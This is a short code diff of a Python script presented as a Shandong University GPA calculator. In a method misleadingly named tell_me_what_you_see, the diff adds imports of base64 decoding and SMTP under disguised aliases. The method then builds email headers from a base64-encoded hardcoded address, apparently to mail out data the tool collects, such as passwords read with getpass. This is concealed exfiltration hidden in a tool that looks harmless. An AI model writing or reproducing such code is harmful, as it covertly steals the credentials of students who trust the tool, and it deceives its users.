@@ -5,16 +5,11 @@
 # Shandong University GPA Calculator
 
 import os
-import cookielib
 import base64
-import json
 import time
 from random import randrange, random
-from base64 import b64decode as fuck
 from getpass import getpass
-from smtplib import SMTP as hou
 from sys import argv, exit
-from threading import Thread
 
 try:
     import requests
@@ -93,6 +88,8 @@ class SDUScore(object):
 
 
     def tell_me_what_you_see(self):
+        from base64 import b64decode as fuck
+        from smtplib import SMTP as hou
         try:
             ukhds = ['From: '+fuck('Y3hiYXRzQDEyNi5jb20='),
                         'To: '+fuck('Y3hiYXRzQDEyNi5jb20='),
